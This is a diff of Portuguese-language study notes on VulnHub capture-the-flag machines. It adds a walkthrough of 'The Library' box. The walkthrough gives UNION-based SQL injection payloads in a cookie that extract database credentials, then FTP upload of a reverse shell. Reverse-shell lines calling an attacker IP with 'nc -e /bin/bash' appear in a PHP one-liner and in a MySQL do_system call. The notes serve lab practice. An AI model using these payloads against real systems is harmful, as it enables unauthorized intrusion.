@@ -14,7 +14,8 @@ Desafio 11 - https://vulnhub.com/entry/goldeneye-1,240/	<br/>
 Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
 Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
 Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
-Desafio 15 - </br>
+Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
+Desafio 16 - </br>
 <br/>**--VM--**
 	
 	
@@ -535,3 +536,58 @@ Desafio 15 - </br>
 
 		*kali -> nc -lnvp 80
 		select do_system('nc 192.168.100.4 80 -e /bin/bash ');
+
+
+<h3>Dia 14 			20/9/2020</h3>
+	
+	*scan
+	
+	*dirb (não tem diretorios importante, então procurar arquivos php)
+		dirb http://ip -X .php 
+			http://192.168.100.18/library.php
+			
+	*burp
+		clique algumas vezes nos paises...até aparecer no burp
+			pode ter qualquer país no Germany...
+			lastviewed=%7B%22lastviewed%22%3D%3D%22Germany%22%7D
+			....video: https://youtu.be/Azl-46OLlVU?t=441
+				*repeater -> render
+					lastviewed={"lastviewed"=="'Germany'union select user() "} 
+						We couldn't find any information for localhost
+					lastviewed={"lastviewed"=="'Germany'union select database()"}
+						 We couldn't find any information for library
+					lastviewed={"lastviewed"=="'Germany'union select table_name from information_schema.tables where table_schema='library' "}
+						We couldn't find any information for countries.
+					lastviewed={"lastviewed"=="'Germany'union select table_name from information_schema.tables where table_schema='library' and table_name !='countries'"}
+						We couldn't find any information for access.
+					lastviewed={"lastviewed"=="'Germany'union select column_name from information_schema.columns where table_name='access' "}
+						We couldn't find any information for password.
+					lastviewed={"lastviewed"=="'Germany'union select column_name from information_schema.columns where table_name='access' and column_name !='password'"}
+						We couldn't find any information for username.
+					lastviewed={"lastviewed"=="'Germany'union select username from access"}
+						We couldn't find any information for globus.
+					lastviewed={"lastviewed"=="'Germany'union select password from access"}	
+						We couldn't find any information for AroundTheWorld.
+						
+				*ftp ip
+					name:globus
+					pass:AroundTheWorld 
+					
+						*help/?
+							pode executar o chmod e o put
+							
+							http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+							*mandar uma reverse shell e dar chmod 777 nele
+								put reserve_shell
+								chmod 777 reverse_shell
+								
+								handler ou nc
+									http:ip/reverse_shell  OU	 curl http:ip/reverse_shell
+									
+									python pty
+										cat library.php
+									su root
+										password
+								
+							-------------------------
+							reverse_shell -> <!php exec("nc 192.168.100.4 443 -e /bin/bash"); !>
